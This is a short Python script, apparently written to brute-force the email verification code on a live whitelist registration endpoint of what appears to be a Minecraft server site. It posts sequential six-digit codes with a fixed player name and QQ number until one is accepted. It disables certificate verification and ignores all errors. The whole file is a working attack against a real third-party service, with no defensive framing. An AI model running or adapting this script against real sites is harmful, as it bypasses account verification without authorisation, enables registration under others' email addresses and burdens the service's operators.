import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ecode = 200000
while True:
    try:
        r = requests.post(
            url="https://white.huahuamc.cn/api/index/register",
            data=f"player_name=176nm456122&qq=1565425154&email_code={ecode}",
            verify=False
        )
        if r.json()["message"] == "邮箱验证码错误或已失效":
            print(f"\r{ecode}", end="", flush=True)
            ecode += 1
        if r.json()["code"] == 200:
            print(f"\r{ecode}", end="", flush=True)
            break
    except Exception as err:
        a = 0
